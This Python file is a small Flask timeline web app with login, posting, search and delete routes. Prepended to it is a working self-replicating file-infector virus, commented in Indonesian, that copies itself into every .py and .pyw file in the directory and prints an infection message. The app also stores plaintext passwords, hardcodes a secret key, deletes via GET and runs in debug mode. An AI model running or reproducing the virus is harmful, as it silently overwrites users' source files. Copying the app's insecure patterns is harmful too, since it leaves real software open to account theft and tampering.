# VIRUS SAYS HI!
import sys
import glob

# Mekanisme Infeksi: Virus mencari file .py lain untuk ditulari
virus_code = []
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

self_replicating_part = False
for line in lines:
    if line.strip() == "# VIRUS SAYS HI!":
        self_replicating_part = True
    if self_replicating_part:
        virus_code.append(line)
    if line.strip() == "# VIRUS SAYS BYE!":
        break

python_files = glob.glob('*.py') + glob.glob('*.pyw')
for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()
    infected = any("# VIRUS SAYS HI!" in line for line in file_code)
    if not infected:
        with open(file, 'w') as f:
            f.writelines(virus_code + ['\n'] + file_code)

def malicious_code():
    print("\n" + "!"*40)
    print("YOU HAVE BEEN INFECTED HAHAHA !!!")
    print("!"*40 + "\n")

malicious_code()
# VIRUS SAYS BYE!

import os
import sqlite3
from flask import Flask, redirect, request, session, render_template

app = Flask(__name__)
app.secret_key = 'sqlinjection'
DATABASE_PATH = os.path.join(os.path.dirname(__file__), 'database.db')

def connect_db():
    conn = sqlite3.connect(DATABASE_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def create_tables():
    with connect_db() as conn:
        cur = conn.cursor()
        cur.execute('''CREATE TABLE IF NOT EXISTS user(id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT NOT NULL UNIQUE, password TEXT NOT NULL)''')
        cur.execute('''CREATE TABLE IF NOT EXISTS time_line(id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER NOT NULL, content TEXT NOT NULL, FOREIGN KEY(user_id) REFERENCES user(id))''')
        conn.commit()

def init_data():
    with connect_db() as conn:
        cur = conn.cursor()
        cur.executemany('INSERT OR IGNORE INTO user(username, password) VALUES (?,?)', [('alice','alicepw'), ('bob','bobpw')])
        cur.executemany('INSERT OR IGNORE INTO time_line(user_id, content) VALUES (?,?)', [(1,'Hello world'), (2,'Hi there')])
        conn.commit()

@app.route('/init')
def init_page():
    create_tables()
    init_data()
    return redirect('/')

@app.route('/')
def index():
    if 'uid' in session:
        with connect_db() as conn:
            cur = conn.cursor()
            cur.execute('SELECT id, user_id, content FROM time_line ORDER BY id DESC')
            tl = [dict(r) for r in cur.fetchall()]
        return render_template('index.html', user=session['username'], tl=tl)
    return redirect('/login')

@app.route('/login', methods=['GET','POST'])
def login():
    if request.method=='POST':
        username = request.form['username']
        password = request.form['password']
        with connect_db() as conn:
            cur = conn.cursor()
            cur.execute("SELECT id, username FROM user WHERE username=? AND password=?", (username, password))
            row = cur.fetchone()
            if row:
                session['uid'] = row['id']
                session['username'] = row['username']
                return redirect('/')
    return '''<form method="post">Username: <input name="username"><br>Password: <input name="password" type="password"><br><button>Login</button></form>'''

@app.route('/create', methods=['POST'])
def create():
    if 'uid' in session:
        content = request.form['content']
        with connect_db() as conn:
            cur = conn.cursor()
            cur.execute('INSERT INTO time_line(user_id, content) VALUES (?,?)', (session['uid'], content))
            conn.commit()
    return redirect('/')

@app.route('/search')
def search():
    keyword = request.args.get('keyword', '')
    with connect_db() as conn:
        cur = conn.cursor()
        cur.execute("SELECT id, user_id, content FROM time_line WHERE content LIKE ?", ('%' + keyword + '%',))
        rows = [dict(r) for r in cur.fetchall()]
    return {'results': rows}

@app.route('/delete/<int:tid>')
def delete(tid):
    if 'uid' in session:
        with connect_db() as conn:
            cur = conn.cursor()
            cur.execute("DELETE FROM time_line WHERE user_id=? AND id=?", (session['uid'], tid))
            conn.commit()
    return redirect('/')

@app.route('/logout')
def logout():
    session.clear()
    return redirect('/login')

if __name__=='__main__':
    app.run(debug=True)